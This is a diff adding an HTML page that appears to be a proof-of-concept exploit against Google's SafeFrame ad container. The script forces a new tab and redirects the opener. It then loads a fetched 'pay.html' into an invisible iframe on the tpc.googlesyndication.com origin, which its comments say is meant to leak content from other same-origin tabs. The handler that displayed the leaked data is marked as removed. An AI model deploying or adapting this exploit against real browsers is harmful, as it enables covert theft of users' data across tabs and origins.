@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<meta charset=utf-8>
+<!-- <button onclick="sendmsg()">SNOOP TAB</button> -->
+<div id="pics"></div>
+<div id="msgs"></div>
+<div id="here"></div>
+<script>
+
+var LASTMESSAGE = {};
+
+function prepdata(a){
+  let l = document.getElementById("msgs");
+  let p = document.createElement("p");
+  p.innerText = a;
+  l.prepend(p);
+}
+
+function pretty(msg){
+  if (msg.origin != "https://tpc.googlesyndication.com" ) {
+    console.debug(`[parent] message of unkown origin ${msg.origin}`);
+    return;
+  }
+
+  /* 
+	* This section has been removed
+	*
+	* The safeframe created below injects "pay.html" into the
+	* tpc.googlesyndication.com origin. The "pay.html" then leaked information
+	* from other "same origin" frames. This function handled messages sent from
+	* pay.html to render the leaked content on the main page.
+	*/
+}
+
+var lastmsg = {};
+window.addEventListener("message", pretty);
+
+// ensure we have a window.opener
+if ( !window.opener ){
+  window.open(window.location.href);
+} else {
+  try {
+    if (window.opener.document.URL == document.URL) {
+      window.opener.document.location = "https://google.com/";
+    }
+  } catch (err) {
+  }
+} 
+
+
+// create invisible iframe to leak content of same origin from other tabs
+var targeturl = "https://tpc.googlesyndication.com/safeframe/1-0-37/html/container.html";
+function make_iframe(data){
+  let frame = document.createElement("iframe");
+  let j = {
+    "uid":"1",
+    "hostPeerName":"https://example.com",
+    "initialGeometry":"{}",
+    "permissions":"{}",
+    "metadata":"{}",
+    "reportCreativeGeometry":false,
+    "isDifferentSourceWindow":false,
+    "goog_safeframe_hlt":{},
+    "encryptionMode":null
+  }
+  frame.width = 0; 
+  frame.height = 0;
+  frame.opacity = 0.0;
+  frame.style= "width:0;height:0;border:0; border:none;";
+  frame.allowtransparency= true;
+  let win_name = "";
+  win_name += `1-0-37;${data.length};`;
+  win_name += data;
+  win_name += JSON.stringify(j);
+  frame.name = win_name;
+  frame.src = targeturl;
+  document.getElementById("here").appendChild(frame);
+}
+fetch("./pay.html")
+  .then(out=>out.text())
+  .then(make_iframe);
+</script>
